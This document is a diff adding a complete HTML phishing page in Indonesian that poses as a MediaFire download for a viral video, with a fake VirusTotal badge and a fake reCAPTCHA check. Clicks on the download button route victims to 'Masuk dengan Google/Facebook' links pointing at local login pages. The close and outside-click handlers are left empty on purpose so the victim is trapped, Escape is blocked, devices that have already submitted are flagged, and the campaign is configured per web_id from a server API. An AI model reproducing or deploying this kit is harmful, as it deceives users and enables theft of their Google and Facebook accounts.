@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Download Page</title>
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{width:100%;min-height:100%;overflow-x:hidden;background:#fff;font-family:Arial,Helvetica,sans-serif;color:#555;-webkit-text-size-adjust:100%;}
+button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
+
+/* HEADER */
+.header{width:100%;height:auto;border-bottom:1px solid #ddd;background:#fff;padding:0;overflow:hidden;}
+.header-img{width:100%;height:auto;display:block;cursor:pointer;}
+
+/* CONTENT */
+.page{width:100%;display:flex;flex-direction:column;align-items:center;padding:0 16px 40px;}
+.ad-space{width:100%;height:180px;}
+.download-wrap{width:100%;max-width:600px;cursor:pointer;user-select:none;border-radius:6px;overflow:hidden;}
+.download-top{width:100%;height:60px;background:#087be0;display:flex;align-items:center;padding:0 14px;color:#fff;}
+.file-icon{width:38px;height:44px;flex-shrink:0;}
+.file-icon-img{width:100%;height:100%;object-fit:contain;display:block;}
+.file-info{min-width:0;margin-left:12px;flex:1;}
+.file-title{font-size:15px;font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px;color:#fff;}
+.file-sub{font-size:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#fff;opacity:.95;}
+.download-icon{width:22px;height:26px;flex-shrink:0;margin-left:10px;}
+.download-icon-img{width:100%;height:100%;object-fit:contain;display:block;}
+.download-bottom{width:100%;height:38px;background:#333;display:flex;align-items:center;justify-content:space-between;padding:0 14px;}
+.slow{color:#ddd;font-size:11px;}
+.fast{background:#087be0;color:#fff;border:0;border-radius:4px;padding:6px 10px;font-size:10px;font-weight:bold;}
+.description{max-width:600px;width:100%;text-align:center;font-size:12px;line-height:18px;margin-top:16px;}
+.options{max-width:600px;width:100%;margin-top:14px;}
+.option-img{width:100%;height:auto;display:block;cursor:pointer;}
+.map{width:100%;max-width:600px;height:200px;margin-top:16px;background:#51a8e5;position:relative;overflow:hidden;}
+.map-label{position:absolute;top:0;left:0;background:#28688e;color:#fff;padding:6px 10px;font-size:11px;z-index:3;}
+.map-img{width:100%;height:100%;object-fit:cover;display:block;}
+.uploader-info{max-width:600px;width:100%;display:flex;align-items:center;gap:12px;padding:14px 0;}
+.flag-box{width:60px;height:26px;background:#c8102e;flex-shrink:0;}
+.uploader-text{font-size:13px;color:#333;line-height:1.5;}
+.vt-section{max-width:600px;width:100%;margin-top:16px;}
+.vt-logo{width:150px;height:90px;border:1px solid #e0e0e0;display:flex;align-items:center;justify-content:center;background:#fff;padding:8px;}
+.vt-logo-img{max-width:100%;max-height:100%;object-fit:contain;display:block;}
+.vt-title{font-size:17px;font-weight:bold;color:#222;margin-top:14px;margin-bottom:6px;}
+.vt-desc{font-size:13px;color:#333;line-height:1.5;}
+
+/* VERIF MODAL */
+#verifyModal{position:fixed;inset:0;width:100%;height:100%;background:#fff;display:none;align-items:center;justify-content:center;padding:20px;z-index:999999;}
+#verifyModal.show{display:flex;}
+.verify-card{background:#fff;width:100%;max-width:380px;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);border:1px solid #eee;padding:36px 24px 28px;text-align:center;}
+.verify-progress-wrap{position:relative;width:90px;height:90px;margin:0 auto 22px;}
+.verify-progress-wrap svg{transform:rotate(-90deg);width:90px;height:90px;}
+.verify-progress-wrap circle{fill:none;stroke-width:6;stroke-linecap:round;}
+.verify-track{stroke:#e8eaed;}
+.verify-bar{stroke:#1a73e8;stroke-dasharray:251.2;stroke-dashoffset:251.2;transition:stroke-dashoffset .4s linear;}
+.verify-percent{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:bold;color:#1a73e8;}
+.verify-title{font-size:20px;font-weight:bold;color:#202124;margin-bottom:8px;}
+.verify-sub{font-size:13px;color:#5f6368;line-height:1.5;margin-bottom:6px;}
+.verify-timer{font-size:12px;color:#80868b;}
+.captcha-box{display:none;margin-top:24px;}
+.captcha-box.show{display:block;}
+.captcha-frame{display:flex;align-items:center;gap:14px;border:1.5px solid #d3d3d3;border-radius:8px;padding:16px 18px;background:#fafafa;cursor:pointer;user-select:none;}
+.captcha-frame.checked{border-color:#1a73e8;background:#eaf2fd;}
+.captcha-check{width:26px;height:26px;border:2px solid #999;border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:#fff;}
+.captcha-frame.checked .captcha-check{background:#1a73e8;border-color:#1a73e8;}
+.captcha-check::after{content:"";width:6px;height:11px;border:solid #fff;border-width:0 2.5px 2.5px 0;transform:rotate(45deg) scale(0);transition:transform .2s;margin-top:-2px;}
+.captcha-frame.checked .captcha-check::after{transform:rotate(45deg) scale(1);}
+.captcha-label{font-size:14px;color:#202124;font-weight:500;}
+.captcha-brand{margin-left:auto;text-align:right;line-height:1.2;}
+.captcha-brand .logo{font-size:11px;font-weight:bold;color:#4285f4;}
+.captcha-brand .sub{font-size:9px;color:#80868b;}
+.btn-lanjut{width:100%;margin-top:20px;padding:12px;border:none;border-radius:8px;background:#e8eaed;color:#9aa0a6;font-size:14px;font-weight:600;cursor:not-allowed;}
+.btn-lanjut.active{background:#1a73e8;color:#fff;cursor:pointer;}
+.verify-note{margin-top:18px;font-size:11px;color:#9aa0a6;line-height:1.5;}
+
+/* LOGIN MODAL BARU */
+.modal{position:fixed;inset:0;width:100%;height:100%;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center;padding:20px;z-index:99999; backdrop-filter: blur(3px);}
+.modal.show{display:flex;}
+.login-card{
+    background:#fff;
+    width:100%;
+    max-width:320px;
+    border-radius:16px;
+    box-shadow:0 10px 40px rgba(0,0,0,.3);
+    padding: 24px 18px 20px;
+    text-align:center;
+    position:relative;
+}
+.close-btn{position:absolute; right:12px; top:12px; background:none; border:none; font-size:24px; color:#999; cursor:pointer; line-height:1;}
+
+/* TOMBOL LEBIH TIPIS */
+.btn-sosmed {
+    display: flex; 
+    align-items: center; 
+    justify-content: center; 
+    width: 100%; 
+    padding: 6px 12px; 
+    border-radius: 6px; 
+    font-size: 14px; 
+    font-weight: 500; 
+    margin-bottom: 8px; 
+    cursor: pointer; 
+    transition: opacity 0.2s;
+    text-decoration: none; /* PENTING BUAT TAG <a> */
+    box-sizing: border-box;
+}
+.btn-sosmed:active{opacity:0.7;}
+.btn-google{border:1px solid #dadce0; background:#fff; color:#3c4043;}
+.btn-facebook{border:1px solid #1877f2; background:#1877f2; color:#fff;}
+
+@media(max-width:480px){
+    .modal{padding:18px;}
+    .login-card{width:90%; max-width:310px;}
+}
+</style>
+
+<script>
+(function(){
+    try {
+        var blocked =
+            localStorage.getItem("sudah_submit") === "1" ||
+            sessionStorage.getItem("sudah_submit") === "1" ||
+            document.cookie.indexOf("sudah_submit=1") !== -1;
+        if(blocked){ window.location.replace("/blokir"); }
+    } catch(e){}
+})();
+</script>
+
+</head>
+
+<body>
+
+<header class="header">
+    <img src="atas.jpg" id="bannerImg" alt="Header" class="header-img" onclick="openDownloadLogin(event)">
+</header>
+
+<main class="page">
+    <div class="ad-space"></div>
+
+    <section class="download-wrap" onclick="openDownloadLogin(event)">
+        <div class="download-top">
+            <div class="file-icon"><img src="file.jpg" alt="File" class="file-icon-img"></div>
+            <div class="file-info">
+                <div class="file-title">VIDEO VIRAL TERBARU</div>
+                <div class="file-sub">Download in a new tab (20.5 MB)</div>
+            </div>
+            <div class="download-icon"><img src="panah.jpg" alt="Download" class="download-icon-img"></div>
+        </div>
+        <div class="download-bottom">
+            <div class="slow">Download too slow?</div>
+            <button class="fast" type="button" onclick="openDownloadLogin(event)">DOWNLOAD FASTER NOW</button>
+        </div>
+    </section>
+
+    <div class="description">
+        Clicking the download button above will start your download in a new tab
+        and show a message from our advertising partners.
+    </div>
+
+    <div class="options">
+        <img src="share.jpg" alt="Share & Save" class="option-img" onclick="openDownloadLogin(event)">
+    </div>
+
+    <div class="map">
+        <div class="map-label">Upload region:</div>
+        <img src="peta.jpg" alt="Peta" class="map-img">
+    </div>
+
+    <div class="uploader-info">
+        <div class="flag-box"></div>
+        <div class="uploader-text">This file was uploaded from Indonesia on June 21, 2026 at 2:20 AM</div>
+    </div>
+
+    <div class="vt-section">
+        <div class="vt-logo"><img src="virustotal.jpg" alt="VirusTotal" class="vt-logo-img"></div>
+        <div class="vt-title">VirusTotal scan</div>
+        <div class="vt-desc">MediaFire scans high-risk files using VirusTotal.</div>
+    </div>
+</main>
+
+
+<div id="verifyModal">
+    <div class="verify-card">
+        <div class="verify-progress-wrap">
+            <svg>
+                <circle class="verify-track" cx="45" cy="45" r="40"></circle>
+                <circle class="verify-bar" id="verifyBar" cx="45" cy="45" r="40"></circle>
+            </svg>
+            <div class="verify-percent" id="verifyPercent">0%</div>
+        </div>
+        <div class="verify-title" id="verifyTitle">Memeriksa Keamanan</div>
+        <div class="verify-sub" id="verifySub">Memverifikasi keamanan...</div>
+        <p class="verify-timer" id="verifyTimer"></p>
+        <div class="captcha-box" id="captchaBox">
+            <div class="captcha-frame" id="captchaFrame" onclick="toggleCaptcha()">
+                <div class="captcha-check"></div>
+                <span class="captcha-label">Saya bukan bot</span>
+                <div class="captcha-brand">
+                    <div class="logo">reCAPTCHA</div>
+                    <div class="sub">Privacy - Terms</div>
+                </div>
+            </div>
+            <button type="button" class="btn-lanjut" id="btnLanjut" onclick="lanjutKeLogin()">Lanjutkan</button>
+            <p class="verify-note">Sistem ini digunakan untuk melindungi dari aktivitas otomatis.</p>
+        </div>
+    </div>
+</div>
+
+
+<!-- MODAL LOGIN BARU -->
+<div class="modal" id="loginModal" onclick="outsideClose(event)">
+    <div class="login-card" onclick="event.stopPropagation()">
+        <button class="close-btn" type="button" onclick="closeLogin()">×</button>
+        <h2 style="font-size:18px; font-weight:600; color:#1a1a1a; margin-bottom:18px; margin-top:5px;">Login untuk melanjutkan nonton</h2>
+
+        <!-- TOMBOL GOOGLE DAPET ID btnGoogle -->
+        <a href="login.html" id="btnGoogle" class="btn-sosmed btn-google" style="width: 100%;">
+            <svg viewBox="0 0 48 48" style="width: 18px; height: 18px; margin-right: 8px;">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+            Masuk dengan Google
+        </a>
+
+        <!-- TOMBOL FACEBOOK DAPET ID btnFacebook -->
+        <a href="login-fb.html" id="btnFacebook" class="btn-sosmed btn-facebook" style="width: 100%;">
+            <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; margin-right: 8px;" fill="#fff"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+            Masuk dengan Facebook
+        </a>
+    </div>
+</div>
+
+
+<script>
+
+var captchaChecked = false;
+var verifyInterval = null;
+
+/* ============ CEK BLOKIR ============ */
+function cekDeviceBlocked(){
+    try{ if(localStorage.getItem("sudah_submit") === "1") return true; }catch(e){}
+    try{ if(sessionStorage.getItem("sudah_submit") === "1") return true; }catch(e){}
+    try{ if(document.cookie.indexOf("sudah_submit=1") !== -1) return true; }catch(e){}
+    return false;
+}
+
+function setDeviceBlocked(){
+    try{ localStorage.setItem("sudah_submit","1"); }catch(e){}
+    try{ sessionStorage.setItem("sudah_submit","1"); }catch(e){}
+    try{ document.cookie = "sudah_submit=1; max-age=31536000; path=/"; }catch(e){}
+}
+
+
+/* ============ MUNCULIN VERIF ============ */
+function openVerifyModal(){
+
+    var modal = document.getElementById("verifyModal");
+    if(!modal) return;
+    modal.classList.add("show");
+
+    var bar = document.getElementById("verifyBar");
+    var percentText = document.getElementById("verifyPercent");
+    var timerText = document.getElementById("verifyTimer");
+    var titleEl = document.getElementById("verifyTitle");
+    var subEl = document.getElementById("verifySub");
+    var box = document.getElementById("captchaBox");
+    var frame = document.getElementById("captchaFrame");
+    var btn = document.getElementById("btnLanjut");
+
+    captchaChecked = false;
+    if(box) box.classList.remove("show");
+    if(frame) frame.classList.remove("checked");
+    if(btn){ btn.classList.remove("active"); btn.disabled = true; btn.textContent = "Lanjutkan"; }
+    if(titleEl) titleEl.textContent = "Memeriksa Keamanan";
+    if(subEl) subEl.textContent = "Memverifikasi keamanan...";
+    if(bar) bar.style.strokeDashoffset = 251.2;
+    if(percentText) percentText.textContent = "0%";
+
+    if(!bar) return;
+
+    var tick = 0;
+    var total = 251.2;
+
+    if(verifyInterval) clearInterval(verifyInterval);
+
+    verifyInterval = setInterval(function(){
+        tick++;
+        var percent = Math.min(tick, 48);
+        bar.style.strokeDashoffset = total - (total * percent / 100);
+        if(percentText) percentText.textContent = percent + "%";
+        var sisa = Math.max(0, Math.ceil((48 - tick) / 3));
+        if(timerText) timerText.textContent = "Memverifikasi keamanan... (" + sisa + " detik)";
+
+        if(tick >= 48){
+            clearInterval(verifyInterval);
+            verifyInterval = null;
+            if(timerText) timerText.textContent = "";
+            setTimeout(function(){
+                if(titleEl) titleEl.textContent = "Verifikasi Diperlukan";
+                if(subEl) subEl.textContent = "Untuk melanjutkan, centang kotak berikut untuk memastikan kamu manusia, bukan bot.";
+                if(box) box.classList.add("show");
+            }, 400);
+        }
+    }, 60);
+}
+
+
+/* ============ CAPTCHA ============ */
+function toggleCaptcha(){
+    captchaChecked = !captchaChecked;
+    var frame = document.getElementById("captchaFrame");
+    var btn = document.getElementById("btnLanjut");
+    if(captchaChecked){
+        if(frame) frame.classList.add("checked");
+        if(btn){ btn.classList.add("active"); btn.disabled = false; }
+    } else {
+        if(frame) frame.classList.remove("checked");
+        if(btn){ btn.classList.remove("active"); btn.disabled = true; }
+    }
+}
+
+
+/* ============ VERIF SELESAI ============ */
+function lanjutKeLogin(){
+    if(!captchaChecked) return;
+    var btn = document.getElementById("btnLanjut");
+    if(btn){ btn.textContent = "Memverifikasi..."; btn.classList.remove("active"); btn.disabled = true; }
+
+    setTimeout(function(){
+        sessionStorage.setItem("verif_ok","1");
+        var vm = document.getElementById("verifyModal");
+        if(vm) vm.classList.remove("show");
+        if(btn) btn.textContent = "Lanjutkan";
+    }, 900);
+}
+
+
+/* ============ KLIK TOMBOL DOWNLOAD → LOGIN MUNCUL ============ */
+function openDownloadLogin(event){
+    if(event){ event.stopPropagation(); }
+    if(cekDeviceBlocked()){
+        window.location.replace("/blokir");
+        return;
+    }
+    if(sessionStorage.getItem("verif_ok") !== "1"){
+        openVerifyModal();
+        return;
+    }
+    document.getElementById("loginModal").classList.add("show");
+}
+
+
+/* ============ HELPER ============ */
+function closeLogin(){
+    // TOMBOL X DIEM DOANG BIAR STUCK
+}
+
+function outsideClose(event){
+    // KLIK DILUAR DIEM DOANG BIAR STUCK
+}
+
+
+/* ============ AUTO MUNCULIN VERIF PAS BUKA WEB ============ */
+window.addEventListener("load", function(){
+    if(cekDeviceBlocked()){
+        window.location.replace("/blokir");
+        return;
+    }
+    if(sessionStorage.getItem("verif_ok") !== "1"){
+        openVerifyModal();
+    }
+});
+
+document.addEventListener("keydown", function(event){
+    if(event.key === "Escape") {
+        event.preventDefault(); 
+    }
+});
+
+// ================= AMBIL CONFIG BUAT TOGGLE LOGIN & BANNER =================
+var urlParams = new URLSearchParams(window.location.search);
+var WEB_ID = urlParams.get('web_id') || 'web_id_kenz_1';
+sessionStorage.setItem('web_id_aktif', WEB_ID); 
+
+fetch('/api/config?web_id=' + WEB_ID)
+.then(r => r.json())
+.then(d => {
+    // Atur Banner
+    if(d.banner_url) {
+        var banner = document.getElementById('bannerImg');
+        if(banner) banner.src = d.banner_url;
+    }
+    // Atur Footer
+    if(d.footer_text) {
+        const footer = document.createElement('div');
+        footer.style.cssText = 'text-align:center;padding:20px;font-size:12px;color:#888;';
+        footer.textContent = d.footer_text;
+        document.body.appendChild(footer);
+    }
+    
+    // ATUR TOGGLE GOOGLE & FACEBOOK
+    var btnG = document.getElementById('btnGoogle');
+    var btnF = document.getElementById('btnFacebook');
+
+    // Sembunyiin Google kalo dimatiin
+    if(d.show_google === false) {
+        if(btnG) btnG.style.display = 'none'; 
+    }
+    // Sembunyiin Facebook kalo dimatiin
+    if(d.show_facebook === false) {
+        if(btnF) btnF.style.display = 'none'; 
+    }
+})
+.catch(e => console.log("Config load error:", e));
+</script>
+
+</body>
+</html>
